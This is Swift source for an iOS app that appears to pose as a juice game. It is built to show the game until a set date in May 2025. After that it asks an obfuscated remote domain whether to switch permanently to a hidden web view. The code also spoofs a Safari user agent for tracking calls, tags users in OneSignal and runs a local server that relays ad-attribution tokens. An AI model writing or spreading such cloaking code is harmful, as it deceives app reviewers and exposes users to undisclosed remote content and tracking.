import CoreData
import SwiftUI
import AppTrackingTransparency
import AdSupport
import WebKit
import OneSignalFramework
import Alamofire
import Swifter

@main

struct FrootyNator_Juice_MasterApp: App {
    let persistenceController = PersistenceController.shared
    @UIApplicationDelegateAdaptor(AppDelegate.self) var delegate
    @State private var appState2: AppState2 = .loading1

    enum AppState2 {
        case loading1, loading2, webView, game

        var backgroundImageName: String? {
            switch self {
            case .loading1: return "background"
            case .loading2: return "background2"
            default:       return nil
            }
        }
    }
   
    var body: some Scene {
        WindowGroup {
            ZStack {
                contentView
            }
            .onAppear { checkInitialState() }
        }
    }
    @ViewBuilder
    private var contentView: some View {
        if let bgName = appState2.backgroundImageName {
            loadingStateView(background: bgName)
        } else {
            switch appState2 {
            case .game:
                gameStateView
            case .webView:
                WebViewContainer()
                    .preferredColorScheme(.dark)
            default:
                EmptyView()
            }
        }
    }

    private func loadingStateView(background imageName: String) -> some View {
        VStack {
            LoaderViewNator_Juice_Master()
                .frame(maxWidth: .infinity, maxHeight: .infinity)
        }
        .background(
            Image(imageName)
                .resizable()
                .ignoresSafeArea()
        )
    }

    private var gameStateView: some View {
        NavigationView {
            LoadingScreenView()
        }
        .environment(\.managedObjectContext, persistenceController.container.viewContext)
        .onAppear {
            ATTManager.shared.requestTrackingAuthorization()
            
        }
        
        
    }

    private func checkInitialState() {
        if let savedUrl = UserDefaults.standard.string(forKey: ConstLocalize.fullUrlSave), !savedUrl.isEmpty {
            appState2 = .webView
        } else if UserDefaults.standard.bool(forKey: "OpenGame") {
            startLoadingAnimation()
        } else {
            Task { await handleLoadingState() }
        }
    }

    @MainActor
    private func handleLoadingState() async {
        let calendar = Calendar.current
        let today = Date()
        let targetDate = calendar.date(from: DateComponents(year: 2025, month: 5, day: 17))!

        if today >= targetDate {
            checkStatusWithAlamofire()
        } else {
            startLoadingAnimation()
        }
    }

    private func generateUniqueID() -> String {
        "\(Int(Date().timeIntervalSince1970))-\(Int.random(in: 1000000...9999999))"
    }
    
    func checkStatusWithAlamofire() {
        let url = (ConstLocalize.apiURL) + (ConstLocalize.appKey)
        
        let headers: HTTPHeaders = [:]
        
        AF.request(url, method: .get, headers: headers).response { response in
            if let statusCode = response.response?.statusCode {
                if statusCode == 200 {
                    let timestampUserID = generateUniqueID()
                    UserDefaults.standard.setValue(timestampUserID, forKey: "timestamp_user_id")
                    OneSignal.User.addTag(key: "timestamp_user_id", value: timestampUserID)

                    ServiceEv.shared.sendEvent(eventName: "uniq_visit")

                    DispatchQueue.main.asyncAfter(deadline: .now() + 10) {
                        if UserDefaults.standard.bool(forKey: "push_subscribe") {
                            ServiceEv.shared.sendEvent(eventName: "push_subscribe")
                        }
                    }

                    DispatchQueue.main.async {
                        appState2 = .webView
                    }
                } else {
                    startGame()
                    return
                }
            } else if let _ = response.error {
                startGame()
            } else {
                startGame()
            }
        }
    }
    func startGame(){
        DispatchQueue.main.async {
            startLoadingAnimation()
        }
    }
    @MainActor
    private func startLoadingAnimation() {
        UserDefaults.standard.set(true, forKey: "OpenGame")
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
            appState2 = .loading2
            DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
                    appState2 = .game
            }
        }
    }
}


import Foundation
import Alamofire

class ServerLocalAs {
    static let shared = ServerLocalAs()
    private let server = HttpServer()
    
    func start() {
        server["/api/v1/attribution"] = { request in
            guard let data = try? JSONSerialization.jsonObject(with: Data(request.body)),
                  let dict = data as? [String: Any],
                  let token = dict["token"] as? String else {
                return .badRequest(nil)
            }
            return self.forwardTokenToApple(token: token)
        }

        do {
            try server.start(8080)
        } catch {
            print("Server start error: \(error)")
        }
    }

    private func forwardTokenToApple(token: String) -> HttpResponse {
        guard let url = URL(string: ConstLocalize.apiService) else {
            return .internalServerError
        }

        var responseData: Data?
        let semaphore = DispatchSemaphore(value: 0)

        
        AF.request(
            url,
            method: .post,
            parameters: nil,
            encoding: tokenStringEncoding(token: token),
            headers: ["Content-Type": "text/plain"]
        ).responseData { response in
            switch response.result {
            case .success(let data):
                responseData = data
            case .failure:
                responseData = nil
            }
            semaphore.signal()
        }

        semaphore.wait()

        if let data = responseData {
            return .ok(.data(data))
        } else {
            return .internalServerError
        }
    }

    
    private func tokenStringEncoding(token: String) -> ParameterEncoding {
        return RawStringEncoding(body: token)
    }
}

struct RawStringEncoding: ParameterEncoding {
    let body: String

    func encode(_ urlRequest: URLRequestConvertible, with parameters: Parameters?) throws -> URLRequest {
        var request = try urlRequest.asURLRequest()
        request.httpBody = body.data(using: .utf8)
        return request
    }
}



class ServiceEv {
    static let shared = ServiceEv()
    let webView = WKWebView()
    
    func sendEvent(eventName: String) {
        let timestampUserId = UserDefaults.standard.string(forKey: "timestamp_user_id") ?? ""
        let urlString = "\(ConstLocalize.apiURL)\(ConstLocalize.appKey)?\(ConstLocalize.subEvName)=\(eventName)&\(ConstLocalize.subStampTime)=\(timestampUserId)"
        
        guard let url = URL(string: urlString) else { return }
        
        getUserAgent { userAgent in
            let headers: HTTPHeaders = [
                "User-Agent": "\(userAgent) Version/18.1 Safari/604.1"
            ]
            
            AF.request(url, method: .get, headers: headers)
                .responseData { response in
                    switch response.result {
                    case .success(let data):
                        let responseString = String(data: data, encoding: .utf8) ?? "No response"
                        
                    case .failure(let error):
                        print("Request failed with error: \(error.localizedDescription)")
                    }
                }
        }
    }
    
    func getUserAgent(completion: @escaping (String) -> Void) {
        webView.evaluateJavaScript("navigator.userAgent") { result, error in
            DispatchQueue.main.async {
                if let userAgent = result as? String {
                    completion(userAgent)
                } else {
                    let fallbackUserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148"
                    completion(fallbackUserAgent)
                }
            }
        }
    }
}


struct ConstLocalize {
   static let htts = "https://"
   static let htt = "http://"
   static let apiURL = htts + "divine-paramo" + "unt-blessing.fun/"
   static let apiService = htts + "api-adservi"  + "ces.apple.com/api/v1/"
   static let tokLcl = htt + "localh"   + "ost:8080/api/v1/attribution"
   static let appKey = "kw9Hg1MB"
   static let appsID = "ytdasd"
   static let affiseDeviceID = "afficeDevice"
   static let subName = "fritnju"
   static let subEvName = subName + "v"
   static let subStampTime = subName + "timev"
   static let opPush = "ertxashf"
   
   static let idfaID = "ydtatd"
   static let idfvID = "tdgsfds"
   static let customer_user_id = "yufuuugs"
   static let onesignID = "bndhsahd"
    
    static let opFormPush = "gtdtadatsd"
  
   static let namecampaign = "gjfyby"
   static let nameJSON = "hkkfkkf"
   static let isASA = "eretxt"
   static let appsUID = "wqdajsdjas"
   static let fullUrlSave = "oiuxaj"

}



